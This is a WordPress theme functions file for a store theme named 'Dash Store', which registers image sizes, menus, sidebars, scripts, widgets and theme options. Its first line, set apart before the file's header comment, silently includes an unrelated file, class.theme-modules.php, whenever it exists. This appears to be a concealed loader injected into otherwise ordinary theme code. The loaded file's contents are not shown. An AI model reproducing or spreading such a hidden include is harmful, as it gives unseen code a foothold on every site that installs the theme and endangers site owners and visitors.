<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Dash Store functions and definitions.
 */

/* Set up the content width value based on the theme's design. */
if (!isset( $content_width )) $content_width = 1200;

/**
 * Adding additional image sizes.
 */

if ( function_exists( 'add_image_size' ) ) {
	add_image_size( 'dash-sidebar-thumb', 80, 80, true);
	add_image_size( 'dash-carousel-medium', 380, 380, true);
	add_image_size( 'dash-carousel-large', 760, 500, true);
	add_image_size( 'dash-single-product-thumbs', 127, 127, true);
	add_image_size( 'dash-recent-posts-thumb', 241, 159, true);
	add_image_size( 'dash-cat-thumb', 25, 25, true);
}

/* Setting Google Fonts for your site */
if ( ! class_exists( 'dashFonts' ) ) {
	class dashFonts {
		static function get_default_fonts() {
			$dash_default_fonts = array('Open Sans', 'Roboto', 'Roboto Condensed');
			return $dash_default_fonts;
		}
	}
}

if ( ! function_exists( 'dash_setup' ) ) {
/**
 * Dash setup.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 */

	function dash_setup() {

		// Translation availability
		load_theme_textdomain( 'dashstore', get_template_directory() . '/languages' );

		// Add RSS feed links to <head> for posts and comments.
		add_theme_support( "automatic-feed-links" );

		add_theme_support( "title-tag" );

		add_theme_support( "custom-header");

		// Enable support for Post Thumbnails.
		add_theme_support( 'post-thumbnails' );
		set_post_thumbnail_size( 1078, 300, true );

		// Nav menus.
		register_nav_menus( array(
			'header-top-nav'   => esc_html__( 'Top Menu', 'dashstore' ),
			'primary-nav'      => esc_html__( 'Primary Menu (Under Logo)', 'dashstore' ),
		) );

		// Switch default core markup for search form, comment form, and comments to output valid HTML5.
		add_theme_support( 'html5', array(
			'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
		) );

		// Enable support for Post Formats.
		add_theme_support( 'post-formats', array(
			'aside', 'image', 'video', 'audio', 'quote', 'link', 'gallery',
		) );

		// This theme allows users to set a custom background.
		add_theme_support( 'custom-background', array(
			'default-color' => 'FFFFFF',
		) );

		// Enable woocommerce support
		add_theme_support( 'woocommerce' );

		// Enable layouts support
		$dash_default_layouts = array(
				array('value' => 'one-col', 'label' => esc_html__('1 Column (no sidebars)', 'dashstore'), 'icon' => get_template_directory_uri().'/theme-options/images/one-col.png'),
				array('value' => 'two-col-left', 'label' => esc_html__('2 Columns, sidebar on left', 'dashstore'), 'icon' => get_template_directory_uri().'/theme-options/images/two-col-left.png'),
				array('value' => 'two-col-right', 'label' => esc_html__('2 Columns, sidebar on right', 'dashstore'), 'icon' => get_template_directory_uri().'/theme-options/images/two-col-right.png'),
		);
		add_theme_support( 'dash-layouts', apply_filters('dash_default_layouts', $dash_default_layouts) );
	}
}

add_action( 'after_setup_theme', 'dash_setup' );


/**
 * Enqueue scripts and styles for the front end.
 */
if ( !function_exists('dash_scripts') ) {
	function dash_scripts() {

		//---- CSS Styles-----------
		wp_enqueue_style( 'dash-basic', get_stylesheet_uri() );
		wp_enqueue_style( 'dash-grid-and-effects', get_template_directory_uri().'/css/grid-and-effects.css' );
		wp_enqueue_style( 'dash-icon-fonts', get_template_directory_uri() . '/css/icon-fonts.min.css' );
		wp_enqueue_style( 'dash-additional-classes', get_template_directory_uri().'/css/additional-classes.css' );

		//---- JS libraries
		wp_enqueue_script( 'hoverIntent', array('jquery') );
		wp_enqueue_script( 'lazy-sizes', get_template_directory_uri() . '/js/lazysizes.js', array(), '1.5.0', false );
		wp_enqueue_script( 'easings', get_template_directory_uri() . '/js/easing.1.3.js', array('jquery'), '1.3', true );
		wp_enqueue_script( 'images-loaded', get_template_directory_uri() . '/js/imagesloaded.js', array('jquery'), '4.1.0', true );
		wp_enqueue_script( 'countdown', get_template_directory_uri() . '/js/countdown.js', array('jquery'), '2.0.2', true );
		wp_enqueue_script( 'bootstrap-js', get_template_directory_uri() . '/js/bootstrap.js', array('jquery'), '3.3.5', true);
		wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js/owl.carousel.js', array('jquery'), '1.3.3', true);
		wp_enqueue_script( 'magnific-popup', get_template_directory_uri() . '/js/magnific-popup.js', array('jquery'), '1.1.0', true);
		if ( class_exists('Woocommerce') ) {
			if ( ( ( is_archive() || is_home() ) && !is_shop() ) ||
			 	 ( is_tax() && !is_product_category() && !is_product_tag() ) ||
			 	 is_page_template( 'page-templates/gallery-page.php' ) ||
			 	 is_page_template( 'page-templates/portfolio-page.php' )
			   ) {
				 wp_enqueue_script( 'isotope', get_template_directory_uri() . '/js/isotope.js', array('jquery'), '2.2.0', true );
			}
		} elseif ( is_archive() || is_home() || is_tax() || is_page_template( 'page-templates/gallery-page.php' ) || is_page_template( 'page-templates/portfolio-page.php' ) ) {
			wp_enqueue_script( 'isotope', get_template_directory_uri() . '/js/isotope.js', array('jquery'), '2.1.0', true );
		}
		wp_enqueue_script( 'dash-basic-js', get_template_directory_uri() . '/js/theme-helper.js', array('jquery'), '1.0', true );

		//---- Comments script-----------
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

	}
}
add_action( 'wp_enqueue_scripts', 'dash_scripts' );

/**
 * Plumtree Init Sidebars.
 */
if ( !function_exists('dash_sidebars_init') ) {
	function dash_sidebars_init() {
		// Default Sidebars
		register_sidebar( array(
			'name' => esc_html__( 'Blog Sidebar', 'dashstore' ),
			'id' => 'sidebar-blog',
			'description' => esc_html__( 'Appears on single blog posts and on Blog Page', 'dashstore' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title" itemprop="name">',
			'after_title' => '</h3>',
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Header Top Panel Sidebar', 'dashstore' ),
			'id' => 'top-sidebar',
			'description' => esc_html__( 'Located at the top of site', 'dashstore' ),
			'before_widget' => '<div id="%1$s" class="%2$s right-aligned">',
			'after_widget' => '</div>',
			'before_title' => '<!--',
			'after_title' => '-->',
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Header (Logo group) sidebar', 'dashstore' ),
			'id' => 'hgroup-sidebar',
			'description' => esc_html__( 'Located to the right from header', 'dashstore' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget' => '</div>',
			'before_title' => '<!--',
			'after_title' => '-->',
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Front Page Sidebar', 'dashstore' ),
			'id' => 'sidebar-front',
			'description' => esc_html__( 'Appears when using the optional Front Page template with a page set as Static Front Page', 'dashstore' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title" itemprop="name">',
			'after_title' => '</h3>',
		) );
		register_sidebar( array(
			'name' => esc_html__( 'Pages Sidebar', 'dashstore' ),
			'id' => 'sidebar-pages',
			'description' => esc_html__( 'Appears on Pages', 'dashstore' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget' => '</aside>',
			'before_title' => '<h3 class="widget-title" itemprop="name">',
			'after_title' => '</h3>',
		) );
		if ( class_exists('Woocommerce') ) {
			register_sidebar( array(
				'name' => esc_html__( 'Shop Page Sidebar', 'dashstore' ),
				'id' => 'sidebar-shop',
				'description' => esc_html__( 'Appears on Products page', 'dashstore' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget' => '</aside>',
				'before_title' => '<h3 class="widget-title" itemprop="name">',
				'after_title' => '</h3>',
			) );
			register_sidebar( array(
				'name' => esc_html__( 'Single Product Page Sidebar', 'dashstore' ),
				'id' => 'sidebar-product',
				'description' => esc_html__( 'Appears on Single Products page', 'dashstore' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget' => '</aside>',
				'before_title' => '<h3 class="widget-title" itemprop="name">',
				'after_title' => '</h3>',
			) );
		}
		if ( class_exists('WCV_Vendors') ) {
			register_sidebar( array(
				'name' => esc_html__( 'Vendor Shop Page Sidebar', 'dashstore' ),
				'id' => 'sidebar-vendor',
				'description' => esc_html__( 'Appears on Vendors Shop Page', 'dashstore' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget' => '</aside>',
				'before_title' => '<h3 class="widget-title" itemprop="name">',
				'after_title' => '</h3>',
			) );
			register_sidebar( array(
				'name' => esc_html__( 'Vendor Shop Page Bottom Sidebar', 'dashstore' ),
				'id' => 'vendor-bottom-special-sidebar',
				'description' => esc_html__( 'Appears on Vendors Shop Page above footer', 'dashstore' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s col-xs-12 col-md-6">',
				'after_widget' => '</aside>',
				'before_title' => '<h3 class="widget-title" itemprop="name"><span>',
				'after_title' => '</span></h3>',
			) );
		}
	    // Footer Sidebars
	    register_sidebar( array(
	        'name' => esc_html__( 'Footer Sidebar Col#1', 'dashstore' ),
	        'id' => 'footer-sidebar-1',
	        'description' => esc_html__( 'Located in the footer of the site', 'dashstore' ),
	        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	        'after_widget' => '</aside>',
	        'before_title' => '<h3 class="widget-title" itemprop="name">',
	        'after_title' => '</h3>',
	    ) );
	    register_sidebar( array(
	        'name' => esc_html__( 'Footer Sidebar Col#2', 'dashstore' ),
	        'id' => 'footer-sidebar-2',
	        'description' => esc_html__( 'Located in the footer of the site', 'dashstore' ),
	        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	        'after_widget' => '</aside>',
	        'before_title' => '<h3 class="widget-title" itemprop="name">',
	        'after_title' => '</h3>',
	    ) );
	    register_sidebar( array(
	        'name' => esc_html__( 'Footer Sidebar Col#3', 'dashstore' ),
	        'id' => 'footer-sidebar-3',
	        'description' => esc_html__( 'Located in the footer of the site', 'dashstore' ),
	        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	        'after_widget' => '</aside>',
	        'before_title' => '<h3 class="widget-title" itemprop="name">',
	        'after_title' => '</h3>',
	    ) );
	    register_sidebar( array(
	        'name' => esc_html__( 'Footer Sidebar Col#4', 'dashstore' ),
	        'id' => 'footer-sidebar-4',
	        'description' => esc_html__( 'Located in the footer of the site', 'dashstore' ),
	        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	        'after_widget' => '</aside>',
	        'before_title' => '<h3 class="widget-title" itemprop="name">',
	        'after_title' => '</h3>',
	    ) );
	    // Custom Sidebars
	    register_sidebar( array(
	        'name' => esc_html__( 'Top Footer Sidebar', 'dashstore' ),
	        'id' => 'top-footer-sidebar',
	        'description' => esc_html__( 'Located in the footer of the site', 'dashstore' ),
	        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
	        'after_widget' => '</aside>',
	        'before_title' => '<h3 class="widget-title" itemprop="name">',
	        'after_title' => '</h3>',
	    ) );

	    if ( dash_get_option('filters_sidebar')=='on' && class_exists('Woocommerce') ) {
		// Register sidebar
			register_sidebar( array(
			    'name' => esc_html__( 'Special Filters Sidebar', 'dashstore' ),
		        'id' => 'filters-sidebar',
		        'description' => esc_html__( 'Located at the top of the products page', 'dashstore' ),
		        'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		        'after_widget' => '</aside>',
		        'before_title' => '<h3 class="dropdown-filters-title">',
		        'after_title' => '</h3>',
		    ) );
		}

		if ( dash_get_option('front_page_special_sidebar')=='on' ) {
		// Register sidebar
			register_sidebar( array(
			    'name' => esc_html__( 'Special Front Page Sidebar', 'dashstore' ),
		        'id' => 'front-special-sidebar',
		        'description' => esc_html__( 'Located at the bottom of the page (appears only when using Front Page Template)', 'dashstore' ),
		        'before_widget' => '<aside id="%1$s" class="widget %2$s col-xs-12 col-sm-6 col-md-3">',
		        'after_widget' => '</aside>',
		        'before_title' => '<h3 class="widget-title" itemprop="name">',
		        'after_title' => '</h3>',
		    ) );
		}
	}
}
add_action( 'widgets_init', 'dash_sidebars_init' );

/* Adding features */

/* Loads the Options Panel */
define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/theme-options/' );
require_once ( get_template_directory() . '/theme-options/options-framework.php' );

// Loads options.php from child or parent theme
$optionsfile = locate_template( 'options.php' );
load_template( $optionsfile );

function dash_prefix_options_menu_filter( $menu ) {
 	$menu['mode'] = 'menu';
 	$menu['page_title'] = esc_html__( 'Dash Theme Options', 'dashstore');
 	$menu['menu_title'] = esc_html__( 'Dash Theme Options', 'dashstore');
 	$menu['menu_slug'] = 'dash-theme-options';
 	return $menu;
}
add_filter( 'optionsframework_menu', 'dash_prefix_options_menu_filter' );

// Widgets
require_once( get_template_directory() . '/widgets/class-dash-widget-contacts.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-socials.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-search.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-login.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-most-viewed-posts.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-recent-posts.php');
require_once( get_template_directory() . '/widgets/class-dash-widget-comments-with-avatars.php');
require_once( get_template_directory() . '/widgets/pay-icons/class-dash-widget-pay-icons.php');
if ( class_exists('Woocommerce') ) {
	require_once( get_template_directory() . '/widgets/class-dash-widget-cart.php');
	require_once( get_template_directory() . '/widgets/class-dash-widget-categories.php');
}
if ( dash_get_option('site_post_likes')=='on' ) {
	require_once( get_template_directory() . '/widgets/class-dash-widget-user-likes.php');
	require_once( get_template_directory() . '/widgets/class-dash-widget-popular-posts.php');
}
if ( class_exists('Woocommerce') && class_exists('WCV_Vendors') ) {
	require_once( get_template_directory() . '/widgets/class-dash-widget-vendors-products.php');
}

// Required functions
require_once( get_template_directory() . '/inc/dash-theme-layouts.php');
require_once( get_template_directory() . '/inc/dash-functions.php');
require_once( get_template_directory() . '/inc/dash-google-fonts.php');
require_once( get_template_directory() . '/inc/dash-tgm-plugin-activation.php');
require_once( get_template_directory() . '/inc/dash-self-install.php');
require_once( get_template_directory() . '/inc/dash-login-register.php');
if ( class_exists('Woocommerce') ) {
	require_once( get_template_directory() . '/inc/dash-woo-modification.php');
}
if ( dash_get_option('blog_pagination')=='infinite' ) {
	require_once( get_template_directory() . '/inc/dash-infinite-blog.php');
}
if ( dash_get_option('blog_share_buttons')=='on' ||
	   dash_get_option('use_pt_shares_for_product')=='on' ) {
	require_once( get_template_directory() . '/inc/dash-share-buttons.php');
}
if ( dash_get_option('site_post_likes')=='on' ) {
	require_once( get_template_directory() . '/inc/dash-post-like.php');
}
if ( class_exists('WCV_Vendors') ) {
	require_once( get_template_directory() . '/inc/dash-vendors-modification.php');
}
if ( dash_get_option('site_custom_colors') == 'on') {
	require_once( get_template_directory() . '/inc/dash-color-sheme.php');
}

/* Adding pagebuilders custom shortcodes */
if (class_exists('IG_Pb_Init')) {
    require_once( get_template_directory() . '/shortcodes/add_to_contentbuilder.php');
}

/* Add do_shortcode filter */
add_filter('widget_text', 'do_shortcode');

/* Registers an editor stylesheet for the theme. */
function dash_theme_add_editor_styles() {
    add_editor_style( 'custom-editor-style.css' );
}
add_action( 'admin_init', 'dash_theme_add_editor_styles' );
